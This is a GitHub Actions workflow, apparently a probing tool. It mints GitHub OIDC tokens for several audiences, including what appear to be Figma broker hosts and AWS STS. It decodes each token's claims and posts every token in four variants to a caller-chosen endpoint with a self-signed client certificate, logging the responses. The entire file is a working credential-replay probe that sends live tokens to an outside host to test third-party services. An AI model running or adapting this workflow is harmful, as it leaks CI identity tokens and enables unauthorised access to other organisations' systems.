name: mint
on:
  workflow_dispatch:
    inputs:
      target:
        description: endpoint to post the OIDC token to
        required: true
        default: https://example.com/

permissions:
  id-token: write
  contents: read

jobs:
  mint:
    runs-on: self-hosted
    steps:
      - name: run
        run: |
          TARGET="${{ inputs.target }}"
          openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj "/CN=probe" >/dev/null 2>&1
          post() {
            T="$2"
            case "$3" in
              bearer) CODE=$(curl -sk -m 25 --cert c.pem --key k.pem -o out.txt -w '%{http_code}' -X POST -H "Authorization: Bearer $T" "$TARGET") ;;
              xoidc)  CODE=$(curl -sk -m 25 --cert c.pem --key k.pem -o out.txt -w '%{http_code}' -X POST -H "X-GitHub-Oidc-Token: $T" "$TARGET") ;;
              body)   CODE=$(curl -sk -m 25 --cert c.pem --key k.pem -o out.txt -w '%{http_code}' -X POST -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\"}" "$TARGET") ;;
              bodyid) CODE=$(curl -sk -m 25 --cert c.pem --key k.pem -o out.txt -w '%{http_code}' -X POST -H 'Content-Type: application/json' --data-binary "{\"id_token\":\"$T\"}" "$TARGET") ;;
            esac
            echo "RESULT variant=$3 CODE=$CODE LEN=$(wc -c < out.txt)"
            echo "BODY_START"; head -c 400 out.txt; echo; echo "BODY_END"
          }
          for AUD in default gh-broker figma https://gh-broker.figma.com https://gh-broker.staging.figma.com sts.amazonaws.com; do
            if [ "$AUD" = "default" ]; then
              U="$ACTIONS_ID_TOKEN_REQUEST_URL"
            else
              Q=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$AUD")
              U="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$Q"
            fi
            RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$U")
            T=$(printf '%s' "$RESP" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("value",""))')
            if [ -z "$T" ]; then echo "AUD=$AUD MINT_FAILED $RESP"; continue; fi
            echo "===== AUD=$AUD LEN=${#T}"
            printf '%s' "$T" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);print("CLAIMS="+json.dumps(json.loads(base64.urlsafe_b64decode(s))))'
            for V in bearer xoidc body bodyid; do post "$AUD" "$T" "$V"; done
          done
          echo "===== CONTROL garbage token ====="
          post control "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0." bearer
          post control "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0." body
